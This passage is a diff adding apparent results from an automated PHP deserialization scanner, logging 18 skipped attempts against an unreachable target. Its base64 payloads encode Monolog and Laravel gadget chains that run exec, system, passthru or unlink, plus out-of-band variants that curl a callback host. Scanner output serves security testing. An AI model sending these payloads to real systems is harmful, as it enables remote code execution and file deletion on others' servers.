+      "evidence": "static-only",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzg4Y2EzMTI1YzVjNy5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzg4Y2EzMTI1YzVjNy5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzg4Y2EzMTI1YzVjNy5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly84OGNhMzEyNWM1Yzcub29iLnRlc3QvIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vODhjYTMxMjVjNWM3Lm9vYi50ZXN0LyI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovLzg4Y2EzMTI1YzVjNy5vb2IudGVzdC8iO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    }
+  ]
+}
